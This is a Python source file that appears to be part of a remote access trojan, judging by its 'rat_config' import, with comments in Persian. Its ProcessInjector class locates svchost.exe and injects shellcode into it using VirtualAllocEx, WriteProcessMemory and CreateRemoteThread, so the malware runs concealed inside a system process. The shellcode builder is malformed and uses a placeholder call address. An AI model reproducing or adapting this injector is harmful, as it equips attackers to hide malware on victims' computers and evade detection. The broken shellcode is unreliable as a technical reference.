import win32api
import win32con
import win32process
import win32security
import win32file
import struct
import logging
from rat_config import Config
import psutil
import os
import sys

class ProcessInjector:
    def __init__(self):
        if Config.DEBUG_MODE:
            logging.info("ProcessInjector initialized")

    def find_target_process(self, target_name="svchost.exe"):
        """
        پیدا کردن فرآیند هدف (مثل svchost.exe) برای تزریق.
        """
        try:
            for proc in psutil.process_iter(['name', 'pid']):
                if proc.info['name'].lower() == target_name.lower():
                    if Config.DEBUG_MODE:
                        logging.info(f"Found target process: {target_name}, PID: {proc.info['pid']}")
                    return proc.info['pid']
            if Config.DEBUG_MODE:
                logging.warning(f"Target process {target_name} not found")
            return None
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error finding target process: {str(e)}")
            return None

    def inject_code(self, pid, shellcode):
        """
        تزریق شل‌کد به فرآیند هدف.
        """
        try:
            # باز کردن فرآیند با دسترسی‌های لازم
            process_handle = win32api.OpenProcess(
                win32con.PROCESS_ALL_ACCESS, False, pid
            )
            if not process_handle:
                if Config.DEBUG_MODE:
                    logging.error(f"Failed to open process PID: {pid}")
                return False

            # تخصیص حافظه در فرآیند هدف
            mem_address = win32process.VirtualAllocEx(
                process_handle, None, len(shellcode),
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_EXECUTE_READWRITE
            )
            if not mem_address:
                if Config.DEBUG_MODE:
                    logging.error("Failed to allocate memory in target process")
                win32api.CloseHandle(process_handle)
                return False

            # نوشتن شل‌کد در حافظه
            written = win32process.WriteProcessMemory(
                process_handle, mem_address, shellcode, len(shellcode), None
            )
            if not written:
                if Config.DEBUG_MODE:
                    logging.error("Failed to write shellcode to target process")
                win32process.VirtualFreeEx(process_handle, mem_address, 0, win32con.MEM_RELEASE)
                win32api.CloseHandle(process_handle)
                return False

            # ایجاد ترد ریموت برای اجرای شل‌کد
            thread_handle = win32process.CreateRemoteThread(
                process_handle, None, 0, mem_address, None, 0, None
            )
            if not thread_handle:
                if Config.DEBUG_MODE:
                    logging.error("Failed to create remote thread")
                win32process.VirtualFreeEx(process_handle, mem_address, 0, win32con.MEM_RELEASE)
                win32api.CloseHandle(process_handle)
                return False

            # بستن هندل‌ها
            win32api.CloseHandle(thread_handle)
            win32api.CloseHandle(process_handle)
            if Config.DEBUG_MODE:
                logging.info(f"Successfully injected code into PID: {pid}")
            return True

        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Injection error: {str(e)}")
            return False

    def prepare_shellcode(self):
        """
        آماده‌سازی شل‌کد برای اجرای کلاینت.
        برای سادگی، مسیر فایل اجرایی فعلی را اجرا می‌کنیم.
        """
        try:
            # مسیر فایل اجرایی فعلی
            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            # شل‌کد ساده برای اجرای فایل (فقط برای ویندوز)
            # در عمل، باید شل‌کد واقعی تولید کنید (مثل اجرای در حافظه)
            shellcode = (
                b"\x31\xc0"  # xor eax, eax
                b"\x50"      # push eax
                b"\x68" + exe_path.encode('utf-16le') + b"\x00\x00"  # push path
                b"\x68\x6c\x6c\x00\x00"  # push "ll"
                b"\x68\x65\x72\x6e\x65"  # push "erne"
                b"\x68\x6b\x65\x72\x6e"  # push "kern"
                b"\x54"      # push esp
                b"\xb8\x7c\x00\x00\x00"  # mov eax, 0x7c (placeholder for CreateProcess)
                b"\xff\xd0"  # call eax
            )
            return shellcode
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Error preparing shellcode: {str(e)}")
            return None